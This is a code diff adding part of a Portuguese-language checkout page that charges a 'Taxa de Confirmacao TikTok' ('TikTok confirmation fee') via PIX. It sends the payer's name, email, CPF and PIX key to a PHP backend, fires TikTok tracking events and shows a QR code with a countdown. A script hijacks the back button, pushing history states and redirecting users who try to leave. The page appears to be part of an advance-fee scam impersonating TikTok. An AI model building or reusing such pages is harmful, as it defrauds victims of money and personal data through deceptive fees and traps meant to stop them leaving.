+    nomeEl.classList.remove('error');emailEl.classList.remove('error');
+    var nomePartes=nomeEl.value.trim().split(' ').filter(function(p){return p.length>0;});
+    if(nomePartes.length<2){nomeEl.classList.add('error');ok=false;}
+    if(!validarEmail(emailEl.value.trim())){emailEl.classList.add('error');ok=false;}
+    if(!ok){
+      showToast('👆 Preencha todos os campos corretamente');
+      var first=document.querySelector('.field input.error');
+      if(first) first.scrollIntoView({behavior:'smooth',block:'center'});
+      return;
+    }
+
+    // TikTok InitiateCheckout event on click
+    if(typeof ttq!=='undefined'&&typeof ttq.track==='function'){try{ttq.track('InitiateCheckout',{content_id:'taxa_confirmacao_tiktok',content_type:'product',content_name:'Taxa de Confirmacao TikTok',contents:[{content_id:'taxa_confirmacao_tiktok',content_type:'product',content_name:'Taxa de Confirmacao TikTok',quantity:1,price:taxaParam}],value:taxaParam,currency:'BRL'});}catch(e){}}
+
+    var nomeCompleto=nomeEl.value.trim();
+    var email=emailEl.value.trim();
+
+    // Cache PIX
+    var saved=sessionStorage.getItem('pix_data_front');
+    if(saved){
+      try{
+        var ps=JSON.parse(saved);
+        if(ps.expires_at&&Date.now()<ps.expires_at&&ps.amount===taxaParam){
+          PAYMENT_CODE=ps.payment_code;PIX_CODE=ps.pix_code;
+          openModal(nomeCompleto,email,ps);return;
+        }
+      }catch(e){}
+      sessionStorage.removeItem('pix_data_front');
+    }
+
+    var btn=this,text=btn.querySelector('.btn-text');
+    btn.classList.add('loading');btn.disabled=true;text.textContent='Gerando PIX...';
+
+    var ttkTrack = (typeof window.getTtkTracking === 'function') ? window.getTtkTracking() : {};
+    if(typeof window.syncTtkIdentify==='function'){try{window.syncTtkIdentify({email:email});}catch(e){}}
+    fetch('/checkout-route/pagamento-router.php',{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({name:nomeCompleto,nome:nomeCompleto,email:email,amount:taxaParam,offer:'Taxa de Confirmacao',description:'Taxa de Confirmacao TikTok',phone:ttkTrack.phone||'',cpf:ttkTrack.cpf||'',pix_type:ttkTrack.pix_type||params.get('pix_type')||'',pix_key:ttkTrack.pix_key||params.get('pix_key')||'',ttclid:ttkTrack.ttclid||params.get('ttclid')||'',ttp:ttkTrack.ttp||'',src:params.get('src')||params.get('utm_source')||ttkTrack.src||getLeadId(),utm_source:params.get('utm_source')||ttkTrack.utm_source||getLeadId(),utm_medium:params.get('utm_medium')||ttkTrack.utm_medium||'',utm_campaign:params.get('utm_campaign')||ttkTrack.utm_campaign||'',utm_term:params.get('utm_term')||ttkTrack.utm_term||'',utm_content:params.get('utm_content')||ttkTrack.utm_content||'',url_full:window.location.href})
+    })
+    .then(function(r){return r.json();})
+    .then(function(data){
+      btn.classList.remove('loading');btn.disabled=false;text.textContent='Pagar Agora';
+      if(data.error||!data.payment_code){showToast('❌ Erro ao gerar PIX. Tente novamente.');return;}
+      PAYMENT_CODE=data.payment_code;PIX_CODE=data.pix_code||data.pix_copy_paste||'';
+      var ldObj={nome:nomeCompleto,email:email,phone:(window.getTtkTracking?window.getTtkTracking().phone:'')};sessionStorage.setItem('lead_data',JSON.stringify(ldObj));try{localStorage.setItem('lead_data',JSON.stringify(ldObj));localStorage.setItem('ttk_email',email);localStorage.setItem('ttk_name',nomeCompleto);}catch(e){}
+      var expiresAt=Date.now()+(10*60*1000);
+      sessionStorage.setItem('pix_data_front',JSON.stringify({payment_code:PAYMENT_CODE,pix_code:PIX_CODE,amount:taxaParam,expires_at:expiresAt}));
+      if(typeof ttq!=='undefined'&&typeof ttq.track==='function'){try{var _pProps={content_id:'taxa_confirmacao_tiktok',content_type:'product',content_name:'Taxa de Confirmacao TikTok',contents:[{content_id:'taxa_confirmacao_tiktok',content_type:'product',content_name:'Taxa de Confirmacao TikTok',quantity:1,price:taxaParam}],value:taxaParam,currency:'BRL'};ttq.track('InitiateCheckout',_pProps,{event_id:'ic_'+PAYMENT_CODE});ttq.track('AddPaymentInfo',_pProps,{event_id:'api_'+PAYMENT_CODE});ttq.track('PlaceAnOrder',_pProps,{event_id:'pao_'+PAYMENT_CODE});}catch(e){}}
+      openModal(nomeCompleto,email,{expires_at:expiresAt});
+    })
+    .catch(function(){
+      btn.classList.remove('loading');btn.disabled=false;text.textContent='Pagar Agora';
+      showToast('❌ Erro de conexão. Tente novamente.');
+    });
+  });
+
+  function openModal(nomeCompleto,email,pixSaved){
+    document.getElementById('nomeModal').textContent=nomeCompleto.split(' ')[0];
+    var ed=new Date(pixSaved.expires_at);
+    document.getElementById('expiryTime').textContent=pad(ed.getDate())+'/'+pad(ed.getMonth()+1)+'/'+ed.getFullYear()+' '+pad(ed.getHours())+':'+pad(ed.getMinutes())+':'+pad(ed.getSeconds());
+    document.getElementById('pixCodeText').textContent=PIX_CODE||PAYMENT_CODE;
+    var qrContainer=document.getElementById('qrContainer');
+    qrContainer.innerHTML='';
+    if(PIX_CODE&&typeof QRCode!=='undefined'){
+      new QRCode(qrContainer,{text:PIX_CODE,width:180,height:180,colorDark:'#000000',colorLight:'#ffffff',correctLevel:QRCode.CorrectLevel.M});
+    }
+    var remaining=Math.floor((pixSaved.expires_at-Date.now())/1000);
+    TOTAL_SECONDS=remaining>0?remaining:600;
+    document.getElementById('pixModal').classList.add('active');
+    document.body.classList.add('modal-open');
+    renderDepos();startTimer();startPolling(PAYMENT_CODE,nomeCompleto,email);
+  }
+
+  document.getElementById('modalClose').addEventListener('click',function(){
+    if(pollingInterval){if(!confirm('Tem certeza? Seu pagamento ainda está sendo processado.'))return;clearInterval(pollingInterval);}
+    document.getElementById('pixModal').classList.remove('active');document.body.classList.remove('modal-open');
+    var btn=document.getElementById('btnPagar');btn.classList.remove('loading');btn.disabled=false;btn.querySelector('.btn-text').textContent='Pagar Agora';
+  });
+  document.getElementById('pixModal').addEventListener('click',function(e){
+    if(e.target===this&&!pollingInterval){this.classList.remove('active');document.body.classList.remove('modal-open');}
+  });
+
+  function copiarPix(){
+    var code=PIX_CODE||document.getElementById('pixCodeText').textContent;
+    navigator.clipboard.writeText(code).then(function(){
+      var btn=document.getElementById('btnCopiarPix');
+      btn.classList.add('copied');
+      btn.innerHTML='<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Código Copiado!';
+      setTimeout(function(){btn.classList.remove('copied');btn.innerHTML='<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg> Copiar Código PIX';},2500);
+    });
+  }
+  document.getElementById('btnCopiarPix').addEventListener('click',copiarPix);
+  document.getElementById('copyCodeBtn').addEventListener('click',copiarPix);
+
+})();
+</script>
+
+<script>
+(function(){
+  var _redirecionado=false;
+  history.pushState(null,null,location.href);
+  window.addEventListener('popstate',function(){
+    var modal=document.getElementById('pixModal');
+    if(modal&&modal.classList.contains('active')){history.pushState(null,null,location.href);return;}
+    if(_redirecionado)return;
+    _redirecionado=true;history.pushState(null,null,location.href);
+    var dest=new URL('../back/index.html',window.location.href);
+    new URLSearchParams(window.location.search).forEach(function(v,k){dest.searchParams.set(k,v);});
+    window.location.href=dest.toString();
+  });
+})();
+</script>
+<script>window.__TTK_HAS_BACKREDIRECT=true;</script>
+<script src="../assets/tracking.js"></script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon='{"version":"2024.11.0","token":"3d04d58e8080411197bd269faa9f7da8","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+</html>
